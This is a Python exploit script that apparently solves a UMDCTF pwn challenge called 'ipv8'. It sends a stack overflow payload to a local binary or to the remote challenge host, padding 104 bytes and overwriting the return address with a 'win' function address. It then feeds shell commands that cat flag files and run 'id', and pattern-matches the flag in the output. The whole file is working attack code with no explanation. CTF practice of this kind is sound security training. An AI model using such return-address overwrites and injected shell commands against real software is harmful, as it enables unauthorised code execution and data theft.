#!/usr/bin/env python3
# UMDCTF pwn/ipv8 - shortest fast solver
# Author: AnyMoR Entry JOL
# License: MIT
#
# Fast idea:
#   - no prompt synchronization;
#   - build the whole stdin stream once;
#   - send it in one write to the process/socket;
#   - win+4 = 0x402f49, source offset = 104, destination visible size = 48.

import argparse, os, re, socket, struct, subprocess, sys

HOST, PORT = "challs.umdctf.io", 30308
OFF, RET = 104, 0x402F49
IP = b"1.2.3.4"
CMD = b"cat flag.txt 2>/dev/null;cat /flag 2>/dev/null;cat /home/ctf/flag.txt 2>/dev/null;id;exit\n"

def p64(x): return struct.pack("<Q", x)

SRC = IP + b"A" * (OFF - len(IP)) + p64(RET)
DST = IP + b"B" * (48 - len(IP))
DATA = b"x\n" + SRC + b"\nx\n" + DST + b"\n" + CMD

def recv_all(sock, timeout):
    sock.settimeout(timeout)
    out = bytearray()
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk
    return bytes(out)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--remote", action="store_true")
    ap.add_argument("--host", default=HOST)
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--timeout", type=float, default=2.0)
    ap.add_argument("binary", nargs="?", default="./ipv4")
    a = ap.parse_args()

    if a.remote:
        s = socket.create_connection((a.host, a.port), timeout=a.timeout)
        s.sendall(DATA)
        out = recv_all(s, a.timeout)
        s.close()
    else:
        if not os.path.exists(a.binary):
            sys.exit(f"[error] binary not found: {a.binary}")
        if not os.access(a.binary, os.X_OK):
            os.chmod(a.binary, os.stat(a.binary).st_mode | 0o111)
        out = subprocess.run([a.binary], input=DATA, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=a.timeout).stdout

    sys.stdout.buffer.write(out)
    m = re.search(rb"UMDCTF\{[^}\n]+\}|[A-Za-z0-9_-]+CTF\{[^}\n]+\}|flag\{[^}\n]+\}|Star\{[^}\n]+\}", out)
    if m:
        print(f"\n[info] flag: {m.group(0).decode(errors='replace')}")

if __name__ == "__main__":
    main()
